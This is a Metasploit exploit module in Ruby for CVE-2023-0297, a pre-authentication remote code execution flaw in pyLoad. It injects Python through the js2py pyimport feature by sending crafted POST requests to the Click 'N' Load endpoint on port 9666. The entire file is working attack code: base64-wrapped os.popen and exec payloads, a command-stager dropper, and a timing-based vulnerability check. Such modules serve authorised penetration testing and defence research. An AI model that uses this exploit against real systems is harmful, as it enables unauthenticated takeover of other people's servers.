##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'pyLoad js2py Python Execution',
        'Description' => %q{
          pyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport
          functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request
          to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services,
          the primary of which is on port 8000 and can not be used by external hosts. A secondary "Click 'N' Load"
          service runs on port 9666 and can be used remotely without authentication.
        },
        'Author' => [
          'Spencer McIntyre', # metasploit module
          'bAu' # vulnerability discovery
        ],
        'References' => [
          [ 'CVE', '2023-0297' ],
          [ 'URL', 'https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/' ],
          [ 'URL', 'https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad' ],
          [ 'URL', 'https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d' ] # fix commit
        ],
        'DisclosureDate' => '2023-01-13',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'python'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_PYTHON],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ],
          [
            'Python',
            {
              'Platform' => 'python',
              'Arch' => ARCH_PYTHON,
              'Type' => :python_exec
            }
          ],
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(9666),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    sleep_time = rand(5..10)

    _, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_python("import time; time.sleep(#{sleep_time})")
    end

    vprint_status("Elapsed time: #{elapsed_time} seconds")

    unless elapsed_time > sleep_time
      return CheckCode::Safe('Failed to test command injection.')
    end

    CheckCode::Appears('Successfully tested command injection.')
  rescue Msf::Exploit::Failed
    return CheckCode::Safe('Failed to test command injection.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      if execute_command(payload.encoded)
        print_good("Successfully executed command: #{payload.encoded}")
      end
    when :python_exec
      execute_javascript("pyimport builtins;pyimport base64;builtins.exec(base64.b64decode(\"#{Base64.strict_encode64(payload.encoded)}\"));")
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    # use the js2py pyimport command to import the os module to execute a command, use base64 to avoid character issues
    # using popen instead of system ensures that the request is not blocked
    javascript = "pyimport os;pyimport sys;pyimport base64;_=base64.b64decode(\"#{Base64.strict_encode64(cmd)}\");os.popen(sys.version_info[0] < 3?_:_.decode('utf-8'));"
    execute_javascript(javascript)
  end

  def execute_python(python)
    # use the js2py pyimport command to import the builtins module to access exec, use base64 to avoid character issues
    javascript = "pyimport builtins;pyimport base64;builtins.exec(base64.b64decode(\"#{Base64.strict_encode64(python)}\"));"
    execute_javascript(javascript)
  end

  def execute_javascript(javascript)
    # https://github.com/pyload/pyload/blob/7d73ba7919e594d783b3411d7ddb87885aea782d/src/pyload/core/threads/clicknload_thread.py#L153
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'flash', 'addcrypted2'),
      'vars_post' => {
        'crypted' => '',
        'jk' => "#{javascript}f=function f2(){};"
      }
    )

    # the command will either cause the response to timeout or return a 500
    return if res.nil?
    return if res.code == 500 && res.body =~ /Could not decrypt key/

    fail_with(Failure::UnexpectedReply, "The HTTP server replied with a status of #{res.code}")
  end
end
